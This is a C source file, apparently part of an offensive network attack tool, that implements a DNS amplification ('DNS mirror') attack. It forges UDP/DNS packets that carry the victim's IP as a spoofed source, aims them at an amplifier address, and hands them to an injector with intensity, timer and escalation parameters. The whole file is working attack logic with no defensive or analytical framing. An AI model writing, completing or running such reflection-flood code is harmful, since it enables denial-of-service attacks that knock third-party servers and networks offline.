
#include "venus.h"
#include "strix.h"
#include "DNSforge.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : DNS_DEFAULT_PORT
#define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )

static AttackPlan * createAttackDNS( LhfDraft *p_draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = DNS;
    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeDNS, &arg );
    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeDNS, &arg );
    newData->draft = p_draft;
    return newData;
}

void executeAttackDNS( AttackPlan * atkData )
{
    char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
    StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
}

int  ExecuteDnsMirror( void *p_draft )
{
    AttackPlan *plan;
    LhfDraft *draft = (LhfDraft *)p_draft;

    switch( draft->type )
    {
        case DNS:
        default:
            plan = createAttackDNS( draft );
            break;
    }
    executeAttackDNS(plan);
    return 0;
}